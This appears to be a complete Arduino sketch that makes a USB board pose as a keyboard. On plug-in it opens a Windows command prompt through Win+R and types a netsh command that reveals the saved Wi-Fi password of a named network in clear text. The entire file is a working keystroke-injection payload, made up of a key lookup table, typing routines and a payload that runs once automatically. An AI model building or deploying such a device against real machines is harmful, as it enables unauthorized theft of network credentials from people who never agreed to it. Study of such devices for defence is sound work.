/*
  Win‑R → cmd → netsh show profile
  Works with 16U2 firmware  Arduino‑keyboard‑0.3.hex
*/
#include <avr/pgmspace.h>

/* ── modifiers ── */
#define MOD_LCTRL  0x01
#define MOD_LSHIFT 0x02
#define MOD_LALT   0x04
#define MOD_LGUI   0x08   // Windows key

/* ── key‑codes (US) ── */
#define KEY_ENTER  0x28
#define KEY_SPACE  0x2C
#define KEY_MINUS  0x2D
#define KEY_EQUAL  0x2E
#define KEY_QUOTE  0x34   // '
#define KEY_0 0x27 /* … */ 
#define KEY_9 0x26
#define KEY_A 0x04 /* etc. */

uint8_t kbd[8]={0}, empty[8]={0};
void send(const uint8_t* r){ Serial.write(r,8); }
void press(uint8_t k,uint8_t m=0){ kbd[0]=m; kbd[2]=k; send(kbd); }
void release(){ send(empty); }

void hit(uint8_t k,bool sh=false){ press(k, sh?MOD_LSHIFT:0); release(); delay(5); }

/* -- lookup table -- */
struct HidKey { char c; uint8_t code; bool shift; };

const HidKey LUT[] PROGMEM = {
  /* letters */
  {'a',KEY_A,0},{'b',0x05,0},{'c',0x06,0},{'d',0x07,0},{'e',0x08,0},
  {'f',0x09,0},{'g',0x0A,0},{'h',0x0B,0},{'i',0x0C,0},{'j',0x0D,0},
  {'k',0x0E,0},{'l',0x0F,0},{'m',0x10,0},{'n',0x11,0},{'o',0x12,0},
  {'p',0x13,0},{'q',0x14,0},{'r',0x15,0},{'s',0x16,0},{'t',0x17,0},
  {'u',0x18,0},{'v',0x19,0},{'w',0x1A,0},{'x',0x1B,0},{'y',0x1C,0},
  {'z',0x1D,0},
  {'A',KEY_A,1},{'B',0x05,1},{'C',0x06,1},{'D',0x07,1},{'E',0x08,1},
  {'F',0x09,1},{'G',0x0A,1},{'H',0x0B,1},{'I',0x0C,1},{'J',0x0D,1},
  {'K',0x0E,1},{'L',0x0F,1},{'M',0x10,1},{'N',0x11,1},{'O',0x12,1},
  {'P',0x13,1},{'Q',0x14,1},{'R',0x15,1},{'S',0x16,1},{'T',0x17,1},
  {'U',0x18,1},{'V',0x19,1},{'W',0x1A,1},{'X',0x1B,1},{'Y',0x1C,1},
  {'Z',0x1D,1},
  /* digits */
  {'0',KEY_0,0},{'1',0x1E,0},{'2',0x1F,0},{'3',0x20,0},{'4',0x21,0},
  {'5',0x22,0},{'6',0x23,0},{'7',0x24,0},{'8',0x25,0},{'9',KEY_9,0},
  /* misc */
  {' ',KEY_SPACE,0},
  {'-',KEY_MINUS,0},
  {'=',KEY_EQUAL,0},
  {'"',KEY_QUOTE,1}
};

bool lookup(char c,uint8_t& code,bool& sh){
  for(uint8_t i=0;i<sizeof(LUT)/sizeof(LUT[0]);i++){
    if(pgm_read_byte(&LUT[i].c)==c){
      code  = pgm_read_byte(&LUT[i].code);
      sh    = pgm_read_byte(&LUT[i].shift);
      return true;
    }
  }
  return false;
}

void typeStr(const char* s){
  while(*s){
    uint8_t k; bool sh;
    if(lookup(*s,k,sh)) hit(k,sh);
    s++; delay(5);
  }
}

void setup(){
  Serial.begin(9600);
  delay(700);                      // allow enumeration
}

void loop(){
  /* Win+R */
  press('R'-'A'+KEY_A, MOD_LGUI);  // Windows key + R
  release(); delay(400);

  /* cmd + Enter */
  typeStr("cmd");  hit(KEY_ENTER); delay(800);

  /* netsh command */
  typeStr("netsh wlan show profile name=\"SpectrumSetup-D3\" key=clear");
  hit(KEY_ENTER);

  while(true);   // run once
}
